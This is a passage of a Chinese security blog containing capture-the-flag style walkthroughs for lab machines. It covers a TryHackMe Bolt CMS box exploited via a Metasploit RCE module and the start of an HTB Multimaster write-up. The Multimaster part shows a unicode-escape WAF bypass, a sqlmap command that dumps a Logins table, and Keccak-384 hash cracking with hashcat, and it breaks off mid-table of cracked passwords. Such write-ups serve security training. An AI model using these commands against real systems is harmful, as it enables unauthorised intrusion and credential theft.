&lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Bolt | A hero is unleashed&lt;/title&gt;</span><br><span class="line">|     &lt;link href=&quot;https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/theme/base-2018/css/bulma.css?8ca0842ebb&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/theme/base-2018/css/theme.css?6cb66bfe9f&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;generator&quot; content=&quot;Bolt&quot;&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     href=&quot;#main-content&quot; class=&quot;vis</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Date: Tue, 01 Oct 2024 02:14:09 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1</span><br><span class="line">|     Cache-Control: public, s-maxage=600</span><br><span class="line">|     Date: Tue, 01 Oct 2024 02:14:09 GMT</span><br><span class="line">|     Content-Type: text/html; charset=UTF-8</span><br><span class="line">|     X-Debug-Token: cc4424</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en-GB&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Bolt | A hero is unleashed&lt;/title&gt;</span><br><span class="line">|     &lt;link href=&quot;https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/theme/base-2018/css/bulma.css?8ca0842ebb&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/theme/base-2018/css/theme.css?6cb66bfe9f&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;generator&quot; content=&quot;Bolt&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;canonical&quot; href=&quot;http://0.0.0.0:8000/&quot;&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|_    &lt;body class=&quot;front&quot;&gt;</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port8000-TCP:V=7.94SVN%I=7%D=10/1%Time=66FB5AEF%P=x86_64-pc-linux-gnu%r</span><br><span class="line">SF:(GetRequest,29E1,&quot;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Tue,\x2001\x20Oct\</span><br><span class="line">SF:x202024\x2002:14:09\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20</span><br><span class="line">SF:PHP/7\.2\.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x2</span><br><span class="line">SF:0public,\x20s-maxage=600\r\nDate:\x20Tue,\x2001\x20Oct\x202024\x2002:14</span><br><span class="line">SF::09\x20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nX-Debug-T</span><br><span class="line">SF:oken:\x20cc4424\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20lang=\&quot;en-GB\&quot;&gt;\n\x</span><br><span class="line">SF:20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20charset=</span><br><span class="line">SF:\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20name=\&quot;viewport\&quot;\</span><br><span class="line">SF:x20content=\&quot;width=device-width,\x20initial-scale=1\.0\&quot;&gt;\n\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;title&gt;Bolt\x20\|\x</span><br><span class="line">SF:20A\x20hero\x20is\x20unleashed&lt;/title&gt;\n\x20\x20\x20\x20\x20\x20\x20\x2</span><br><span class="line">SF:0&lt;link\x20href=\&quot;https://fonts\.googleapis\.com/css\?family=Bitter\|Rob</span><br><span class="line">SF:oto:400,400i,700\&quot;\x20rel=\&quot;stylesheet\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/theme/base-2018/css/bulma\.c</span><br><span class="line">SF:ss\?8ca0842ebb\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;link\x20rel=\&quot;style</span><br><span class="line">SF:sheet\&quot;\x20href=\&quot;/theme/base-2018/css/theme\.css\?6cb66bfe9f\&quot;&gt;\n\x20\</span><br><span class="line">SF:x20\x20\x20\t&lt;meta\x20name=\&quot;generator\&quot;\x20content=\&quot;Bolt\&quot;&gt;\n\x20\x20</span><br><span class="line">SF:\x20\x20\t&lt;link\x20rel=\&quot;canonical\&quot;\x20href=\&quot;http://0\.0\.0\.0:8000/\</span><br><span class="line">SF:&quot;&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body\x20class=\&quot;front\&quot;&gt;\</span><br><span class="line">SF:n\x20\x20\x20\x20\x20\x20\x20\x20&lt;a\x20&quot;)%r(FourOhFourRequest,1527,&quot;HTT</span><br><span class="line">SF:P/1\.0\x20404\x20Not\x20Found\r\nDate:\x20Tue,\x2001\x20Oct\x202024\x20</span><br><span class="line">SF:02:14:09\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\.3</span><br><span class="line">SF:2-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20private,\x</span><br><span class="line">SF:20must-revalidate\r\nDate:\x20Tue,\x2001\x20Oct\x202024\x2002:14:09\x20</span><br><span class="line">SF:GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\npragma:\x20no-ca</span><br><span class="line">SF:che\r\nexpires:\x20-1\r\nX-Debug-Token:\x205d427e\r\n\r\n&lt;!doctype\x20h</span><br><span class="line">SF:tml&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20init</span><br><span class="line">SF:ial-scale=1\.0\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20&lt;title&gt;Bolt\x20\|\x20A\x20hero\x20is\x20unleashed&lt;/title&gt;\n</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20&lt;link\x20href=\&quot;https://fonts\.googleap</span><br><span class="line">SF:is\.com/css\?family=Bitter\|Roboto:400,400i,700\&quot;\x20rel=\&quot;stylesheet\&quot;</span><br><span class="line">SF:&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=</span><br><span class="line">SF:\&quot;/theme/base-2018/css/bulma\.css\?8ca0842ebb\&quot;&gt;\n\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/theme/base-2018/css/t</span><br><span class="line">SF:heme\.css\?6cb66bfe9f\&quot;&gt;\n\x20\x20\x20\x20\t&lt;meta\x20name=\&quot;generator\&quot;</span><br><span class="line">SF:\x20content=\&quot;Bolt\&quot;&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\</span><br><span class="line">SF:n\x20\x20\x20\x20\x20\x20\x20\x20&lt;a\x20href=\&quot;#main-content\&quot;\x20class=</span><br><span class="line">SF:\&quot;vis&quot;);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Tue Oct  1 10:14:51 2024 -- 1 IP address (1 host up) scanned in 75.38 seconds</span><br></pre></td></tr></table></figure><p>访问后发现，在80端口存在<code>apache</code>默认页面，在8000端口运行着<code>Bolt CMS</code></p><h2 id="Bolt-CMS"><a href="#Bolt-CMS" class="headerlink" title="Bolt CMS"></a>Bolt CMS</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001102149429-713047204.png" alt="image-20241001102140990"></p><p>在页面找到用户名和密码<code>bolt : boltadmin123</code></p><p>网上搜索发现该CMS默认登录路由是<code>/bolt</code>，利用刚才获得的用户名密码登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001103519405-1390007359.png" alt="image-20241001103512011"></p><p>登录成功后发现该版本为<code>3.7.1</code></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>通过<code>searchsploit</code>查找后发现早期的RCE漏洞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001103939174-1828313295.png" alt="image-20241001103932318"></p><p>为了方便后续操作，这里使用msf进行攻击</p><p>通过<code>msfconsole</code>启动msf后，使用search命令进行查询</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001104037415-657957668.png" alt="image-20241001104030417"></p><p>使用<code>use 0</code>命令使用</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001104202808-726963840.png" alt="image-20241001104155662"></p><p>输入<code>show options</code>查看必要参数</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001104306826-932568411.png" alt="image-20241001104300043"></p><p>将必要参数设置好</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001104536892-1525270064.png" alt="image-20241001104529924"></p><p><code>run</code>启动</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001104701130-877158465.png" alt="image-20241001104654139"></p><p>发现直接就是<code>root</code>权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001105113891-316756031.png" alt="image-20241001105107234"></p><p>最终在<code>/home</code>目录下找到flag</p>]]></content>
      
      
      <categories>
          
          <category> TryHackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> THM </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Multimaster</title>
      <link href="/posts/aa5df2c0.html"/>
      <url>/posts/aa5df2c0.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.179</p></blockquote><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li>MSSQL注入</li><li>MSSQL注入枚举域用户</li><li>CVE-2019-1414</li><li>滥用GenericWrite权限横向移动</li><li>滥用Server Operators组权限实现权限提升</li><li>SeBackupPrivilege和SeRestorePrivilege权限的滥用</li></ul><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap -sS -sV -sC -p- 10.10.10.179</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 15:15 CST</span><br><span class="line">Nmap scan report for 10.10.10.179</span><br><span class="line">Host is up (0.42s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: 403 - Forbidden: Access is denied.</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-23 07:23:11Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">|_ssl-date: 2024-07-23T07:24:51+00:00; +7m01s from scanner time.</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: MEGACORP</span><br><span class="line">|   NetBIOS_Domain_Name: MEGACORP</span><br><span class="line">|   NetBIOS_Computer_Name: MULTIMASTER</span><br><span class="line">|   DNS_Domain_Name: MEGACORP.LOCAL</span><br><span class="line">|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL</span><br><span class="line">|   DNS_Tree_Name: MEGACORP.LOCAL</span><br><span class="line">|   Product_Version: 10.0.14393</span><br><span class="line">|_  System_Time: 2024-07-23T07:24:12+00:00</span><br><span class="line">| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL</span><br><span class="line">| Not valid before: 2024-07-22T07:10:19</span><br><span class="line">|_Not valid after:  2025-01-21T07:10:19</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49678/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49705/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49783/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: MULTIMASTER</span><br><span class="line">|   NetBIOS computer name: MULTIMASTER\x00</span><br><span class="line">|   Domain name: MEGACORP.LOCAL</span><br><span class="line">|   Forest name: MEGACORP.LOCAL</span><br><span class="line">|   FQDN: MULTIMASTER.MEGACORP.LOCAL</span><br><span class="line">|_  System time: 2024-07-23T00:24:13-07:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">|_clock-skew: mean: 1h31m00s, deviation: 3h07m51s, median: 7m00s</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-07-23T07:24:16</span><br><span class="line">|_  start_date: 2024-07-23T07:10:28</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 133.27 seconds</span><br></pre></td></tr></table></figure><p>发现有<code>DNS</code>服务、在<code>80</code>端口有<code>http</code>服务、<code>Kerberos</code>服务、<code>rpc</code>服务、<code>smb</code>服务、<code>ldap</code>服务以及<code>3389</code>端口的<code>rdp</code>服务，找到域名为<code>MEGACORP.LOCAL</code>，且主机为<code>Windows Server 2016</code></p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p><code>smbclient -N -L //10.10.10.179</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723153459937-1324338121.png" alt="image-20240723153457969"></p><p>没什么信息</p><h2 id="rpc"><a href="#rpc" class="headerlink" title="rpc"></a>rpc</h2><p><code>rpcclient -U &quot;&quot; 10.10.10.179</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723153807990-1882477100.png" alt="image-20240723153806072"></p><p><code>rpc</code>不允许匿名访问</p><h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><p><code>ldapsearch -H ldap://10.10.10.179:389 -x -b &quot;DC=MEGACORP,DC=LOCAL&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723154220389-36524757.png" alt="image-20240723154218048"></p><p><code>ldap</code>也失败了，可能是身份验证出现了问题</p><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>在<code>80</code> 端口运行着一个<code>web</code>服务</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723154341955-174699650.png" alt="image-20240723154339541"></p><p>测试后发现几乎都点不了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723155009137-1563602452.png" alt="image-20240723155006560"></p><p>在侧边栏点击<code>Colleague Finder</code>后，会有一个搜索框，什么数据都不输点击回车会显示一些人名等信息，仅此而已</p><p>将用户保存下来，可能后面能用到</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sbauer@megacorp.htb</span><br><span class="line">okent@megacorp.htb</span><br><span class="line">ckane@megacorp.htb</span><br><span class="line">kpage@megacorp.htb</span><br><span class="line">shayna@megacorp.htb</span><br><span class="line">james@megacorp.htb</span><br><span class="line">cyork@megacorp.htb</span><br><span class="line">rmartin@megacorp.htb</span><br><span class="line">zac@magacorp.htb</span><br><span class="line">jorden@megacorp.htb</span><br><span class="line">alyx@megacorp.htb</span><br><span class="line">ilee@megacorp.htb</span><br><span class="line">nbourne@megacorp.htb</span><br><span class="line">zpowers@megacorp.htb</span><br><span class="line">zpowers@megacorp.htb</span><br><span class="line">minato@megacorp.htb</span><br><span class="line">egre55@megacorp.htb</span><br></pre></td></tr></table></figure><p>在尝试拿<code>gobuster</code>扫描一下，看看是否有其他信息</p><p><code>gobuster dir -u http://10.10.10.179 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723164047789-118911268.png" alt="image-20240723164045428"></p><p>结果发现有巨多的403，不太符合正常情况，猜测有waf存在</p><p>这种搜索等功能可能会存在<code>sql</code>注入之类的洞，拿<code>burpsuit</code>抓个包看看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723161658318-1989998677.png" alt="image-20240723161655843"></p><p>参数为<code>&#39;</code>试试</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723185010410-55567549.png" alt="image-20240723185008069"></p><p>发现会报错，说明存在过滤，但是没有什么<code>waf</code>信息，尝试<code>fuzz</code>一下</p><p><code>wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/Fuzzing/special-chars.txt -d &#39;&#123;&quot;name&quot;:&quot;FUZZ&quot;&#125;&#39; -H &#39;Content-Type: application/json;charset=utf-8&#39; -t 1 --hc 200</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723200250049-1678420648.png" alt="image-20240723200247938"></p><p>发现返回包中设置的字符编码是<code>utf-8</code>，尝试一下其他编码能否绕过</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723201457071-400479735.png" alt="image-20240723201454802"></p><p>测试后发现将<code>&#39;</code>按照<code>unicode</code>编码后发现可以正常查询。绕过成功</p><h1 id="MSSQL注入"><a href="#MSSQL注入" class="headerlink" title="MSSQL注入"></a>MSSQL注入</h1><h2 id="sqlmap获取数据"><a href="#sqlmap获取数据" class="headerlink" title="sqlmap获取数据"></a>sqlmap获取数据</h2><p>通过<code>unicode</code>编码可以绕过<code>waf</code>，就能正常注入了，这里直接拿<code>sqlmap</code>跑一下</p><p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch</code></p><blockquote><p><code>--tamper=charunicodeescape</code>：将payload中的所有字符进行unicode编码</p><p><code>--delay 5</code>： 延迟时间为5s，避免请求次数太快被ban</p><p><code>--level 5 --risk 3</code>：使用更全面更复杂的payload</p><p><code>--batch</code>：自动接受所有提示</p></blockquote><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724141638815-1142390614.png" alt="image-20240724141634076"></p><p>从上述结果中可以发现，该数据库是<code>SQL Server</code>并且<code>sqlmap</code>成功执行，继续找数据库名</p><p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -dbs</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724142014523-1333297535.png" alt="image-20240724142006540"></p><p>先查看<code>Hub_DB</code>数据库看看有哪些表</p><p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -D Hub_DB -tables</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724143527309-1226900171.png" alt="image-20240724143522636"></p><p>有两个表，直接查看一下表中的值</p><ul><li><code>Colleagues</code></li></ul><p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -D Hub_DB -T Colleagues --dump</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724143758776-409341571.png" alt="image-20240724143754224"></p><p>这是一张同事表，存储着每个人的信息</p><ul><li><code>Logins</code></li></ul><p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -D Hub_DB -T Logins --dump</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724144019780-335466335.png" alt="image-20240724144015197"></p><p>发现是所有用户的用户名和密码，将用户名和密码保存到文件中，方便后续使用</p><ul><li><code>users</code></li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sbauer</span><br><span class="line">okent</span><br><span class="line">ckane</span><br><span class="line">kpage</span><br><span class="line">shayna</span><br><span class="line">james</span><br><span class="line">cyork</span><br><span class="line">rmartin</span><br><span class="line">zac</span><br><span class="line">jorden</span><br><span class="line">alyx</span><br><span class="line">ilee</span><br><span class="line">nbourne</span><br><span class="line">zpowers</span><br><span class="line">aldom</span><br><span class="line">minatotw</span><br><span class="line">egre55</span><br></pre></td></tr></table></figure><ul><li><code>passwords</code></li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739</span><br><span class="line">fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa</span><br><span class="line">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813</span><br><span class="line">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813</span><br><span class="line">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739</span><br><span class="line">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739</span><br><span class="line">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739</span><br><span class="line">fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa</span><br><span class="line">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813</span><br><span class="line">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739</span><br><span class="line">fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa</span><br><span class="line">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813</span><br><span class="line">fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa</span><br><span class="line">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813</span><br><span class="line">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739</span><br><span class="line">cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc</span><br><span class="line">cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc</span><br></pre></td></tr></table></figure><p>这时发现大多数密码都是一样的</p><h2 id="hashcat破解密码"><a href="#hashcat破解密码" class="headerlink" title="hashcat破解密码"></a>hashcat破解密码</h2><p>先利用<code>john</code>尝试破解密码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724154238265-1306385108.png" alt="image-20240724154233559"></p><p>发现并没有成功，尝试使用<code>hash-identifier</code>查看数据类型</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724154552885-955828641.png" alt="image-20240724154548438"></p><p>发现长度为384，测试后发现是<code>Keccak-384</code></p><p><code>hashcat -m 17900 passwords /usr/share/wordlists/rockyou.txt --force</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724154759021-1055109536.png" alt="image-20240724154754519"></p><p>最后也是成功破解出三个密码，虽然数据库中有一堆用户，但是只有四个唯一的密码找到与其对应的用户名</p><div class="table-container"><table><thead><tr><th>用户名</th><th>密码</th></tr></thead><tbody><tr><td>sbauer, shayna, james, cyork, jorden, aldom</td><td>password1</td></tr><tr><td>ckane, kpage, zac, ilee, 